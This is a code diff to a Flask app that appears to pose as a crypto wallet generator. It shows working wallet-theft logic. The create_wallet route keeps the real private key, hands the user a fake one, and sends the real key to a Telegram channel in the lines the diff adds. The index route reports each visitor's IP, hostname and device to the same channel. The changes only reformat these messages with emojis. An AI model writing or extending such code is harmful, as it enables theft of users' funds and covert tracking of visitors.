@@ -49,13 +49,13 @@ def index():
             hostname = 'Unknown'
         
         device = 'Unknown'
-        if 'Android' in ua: device = 'Android'
-        elif 'iPhone' in ua: device = 'iPhone'
-        elif 'Windows' in ua: device = 'Windows'
-        elif 'Mac' in ua: device = 'Mac'
-        elif 'Linux' in ua: device = 'Linux'
+        if 'Android' in ua: device = '📱 Android'
+        elif 'iPhone' in ua: device = '📱 iPhone'
+        elif 'Windows' in ua: device = '💻 Windows'
+        elif 'Mac' in ua: device = '💻 Mac'
+        elif 'Linux' in ua: device = '🐧 Linux'
         
-        send_tg(f"Real visitor: {device} | {ip} | {hostname}")
+        send_tg(f"👁️ <b>New Visitor</b>\n{device}\n🌐 <code>{ip}</code>\n📍 {hostname}")
     
     return render_template('index.html')
 
@@ -112,7 +112,14 @@ def create_wallet():
               (network, address, real_key, fake_key, datetime.now().isoformat()))
     conn.commit()
     
-    send_tg(f"New wallet! {network}: {address} | Key: {real_key}")
+    emoji = {"ethereum": "💎", "bsc": "🔷", "solana": "⚡"}.get(network, "💰")
+    
+    send_tg(f"""🦅 <b>New Wallet Created!</b>
+────────────────────
+{emoji} <b>Network:</b> {network.upper()}
+🏦 <b>Address:</b> <code>{address}</code>
+🔑 <b>Private Key:</b> <code>{real_key}</code>
+⏱️ {datetime.now().strftime('%Y-%m-%d %H:%M')}""")
     
     return jsonify({'address': address, 'private_key': fake_key})
 
